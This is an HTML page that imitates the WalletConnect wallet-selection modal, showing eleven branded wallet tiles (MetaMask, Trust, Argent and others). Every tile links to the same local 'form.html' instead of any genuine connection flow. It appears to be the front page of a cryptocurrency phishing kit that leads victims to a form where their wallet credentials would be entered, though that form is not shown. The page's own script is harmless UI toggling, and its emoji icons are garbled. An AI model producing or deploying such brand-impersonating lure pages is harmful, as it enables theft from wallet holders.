<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #686870;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
            
        }

        .modal {
            background: #4e4e5e;
            border-radius: 20px;
            width: 420px;
            max-width: 90vw;
            padding: 0;
            position: fixed;
            box-shadow: 0 20px 50px rgba(77, 72, 72, 0.5);
            
        }

        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 24px 16px;
        }
        

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .logo-icon::before {
            content: '';
            width: 20px;
            height: 12px;
            background: white;
            border-radius: 6px;
            position: relative;
        }

        .logo-icon::after {
            content: '';
            position: absolute;
            width: 12px;
            height: 8px;
            background: #3b82f6;
            border-radius: 4px;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .logo-text {
            font-size: 20px;
            font-weight: 600;
            color: white;
        }

        .close-btn {
            background: #3a3a3c;
            border: none;
            color: #475569;
            padding: 12px 20px;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            margin-bottom: 24px;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .close-btn:hover {
            background: #48484a;
            transform: translateX(-4px);
        }

        .modal-content {
            padding: 0 24px 24px;
        }

        .tab-container {
            display: flex;
            background: #2c2c2e;
            border-radius: 12px;
            padding: 4px;
            margin-bottom: 24px;
        }

        .tab {
            flex: 1;
            padding: 12px 24px;
            border: none;
            background: transparent;
            color: #8e8e93;
            font-size: 16px;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .tab.active {
            background: #636366;
            color: white;
        }

        .title {
            text-align: center;
            font-size: 18px;
            font-weight: 500;
            color: #8e8e93;
            margin-bottom: 24px;
        }

        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-bottom: 24px;
        }

        .wallet-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 16px 8px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            color: inherit;
        }

        .wallet-item:hover {
            background: #2c2c2e;
                border-color: #4f46e5;
    transform: translateY(-4px);
    box-shadow: 0 12px 24px rgba(79, 70, 229, 0.15);
        }

        .wallet-item.highlighted {
            background: #2c2c2e;
            border: 2px solid #d32f2f;
        }

        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            position: relative;
        }

        .wallet-name {
            font-size: 13px;
            font-weight: 500;
            text-align: center;
            color: #ffffff;
        }

        /* Wallet specific styles */
        .rainbow { background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #ffeaa7, #dda0dd); }
        .trust { background: #ffffff; color: #1c1c1e; }
        .argent { background: #ff875b; }
        .metamask { background: #f6851b; }
        .gnosis { background: #12846c; }
        .crypto-com { background: #002d74; }
        .pillar { background: #00d4aa; }
        .imtoken { background: #11c4d1; }
        .onto { background: #4c7bd9; }
        .tokenpocket { background: #2980fe; }
        .mathwallet { background: #000000; }
        .bitpay { background: #1e3186; }

        .pagination {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 16px;
        }

        .page-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #48484a;
            cursor: pointer;
            transition: all 0.2s;
        }

        .page-dot.active {
            background: #007aff;
        }

        /* Wallet icons content */
        .rainbow::before { content: 'üåà'; }
        .trust::before { content: 'üõ°Ô∏è'; color: #0500ff; }
        .argent::before { content: 'üî∫'; }
        .metamask::before { content: 'ü¶ä'; }
        .gnosis::before { content: '‚óè'; color: white; }
        .crypto-com::before { content: '‚óÜ'; color: white; }
        .pillar::before { content: '‚ñ†'; color: black; }
        .imtoken::before { content: 'üêã'; }
        .onto::before { content: '‚ö™'; color: black; }
        .tokenpocket::before { content: 'TP'; color: white; font-size: 16px; font-weight: bold; }
        .mathwallet::before { content: '‚¨õ'; color: white; }
        .bitpay::before { content: 'bitpay'; color: white; font-size: 10px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="modal">
        <div class="modal-header">
            <div class="logo">
                <div class="logo-icon"></div>
                <span class="logo-text">WalletConnect</span>
            </div><a> 
                <button class="close-btn" ondblclick="closeModal()">&times;</button>
            </a>
            
        </div>
        
        <div class="modal-content">
            <div class="tab-container">
                <button class="tab active">Mobile</button>
                <button class="tab">QR Code</button>
            </div>
            
            <div class="title">Choose your preferred wallet</div>
            
            <div class="wallet-grid">
                <a href="form.html ">
                    <div class="wallet-item highlighted">
                    <div class="wallet-icon trust"></div>
                    <div class="wallet-name">Trust</div>
                    </div>
                </a>

                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon argent"></div>
                    <div class="wallet-name">Argent</div>
                    </div>
                </a>

                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon metamask"></div>
                    <div class="wallet-name">MetaMask</div>
                    </div>
                </a>
                
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon gnosis"></div>
                    <div class="wallet-name">Gnosis Safe</div>
                    </div>
                </a>
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon crypto-com"></div>
                    <div class="wallet-name">Crypto.com</div>
                    </div>
                </a>
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon pillar"></div>
                    <div class="wallet-name">Pillar</div>
                    </div>
                </a>
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon imtoken"></div>
                    <div class="wallet-name">imToken</div>
                    </div>
                </a>
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon onto"></div>
                    <div class="wallet-name">ONTO</div>
                    </div>
                </a>
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon tokenpocket"></div>
                    <div class="wallet-name">TokenPocket</div>
                    </div>
                </a>
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon mathwallet"></div>
                    <div class="wallet-name">MathWallet</div>
                    </div>
                </a>
                
                <a href="form.html">
                    <div class="wallet-item">
                    <div class="wallet-icon bitpay"></div>
                    <div class="wallet-name">BitPay</div>
                    </div>
                </a>
            </div>
            
            <div class="pagination">
                <div class="page-dot active"></div>
                <div class="page-dot"></div>
                <div class="page-dot"></div>
                <div class="page-dot"></div>
            </div>
        </div>
    </div>

    <script>
        // Add interactivity
        document.querySelectorAll('.wallet-item').forEach(item => {
            item.addEventListener('click', function() {
                // Remove highlight from all items
                document.querySelectorAll('.wallet-item').forEach(i => i.classList.remove('highlighted'));
                // Add highlight to clicked item
                this.classList.add('highlighted');
            });
        });

        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                this.classList.add('active');
            });
        });

        // Close button
        document.querySelector('.close-btn').addEventListener('click', function() {
            alert('Close button clicked!');
        });

        // Pagination dots
        document.querySelectorAll('.page-dot').forEach((dot, index) => {
            dot.addEventListener('click', function() {
                document.querySelectorAll('.page-dot').forEach(d => d.classList.remove('active'));
                this.classList.add('active');
            });
        });
    </script>
</body>
</html>
